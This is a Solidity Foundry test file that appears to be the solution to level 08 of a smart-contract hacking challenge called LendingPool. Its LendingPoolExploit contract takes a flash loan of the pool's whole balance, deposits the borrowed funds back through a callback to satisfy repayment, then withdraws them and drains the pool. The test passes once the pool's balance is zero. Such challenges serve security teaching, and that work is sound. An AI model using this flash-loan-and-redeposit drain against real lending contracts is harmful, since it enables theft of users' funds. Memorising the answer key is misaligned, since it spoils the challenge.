// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

contract LendingPoolExploit {
    LendingPool private lendingPool;

    constructor(address _lendingPoolAddress) {
        lendingPool = LendingPool(_lendingPoolAddress);
    }

    receive() external payable {}

    function execute() external payable {
        lendingPool.deposit{value: msg.value}();
    }

    function exploit() external {
        uint256 poolBalance = address(lendingPool).balance;

        lendingPool.flashLoan(poolBalance);
        lendingPool.withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }
}

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;
    LendingPoolExploit exploit;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
        exploit = new LendingPoolExploit(address(instance));
    }

    function testExploitLevel() public {
        exploit.exploit();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
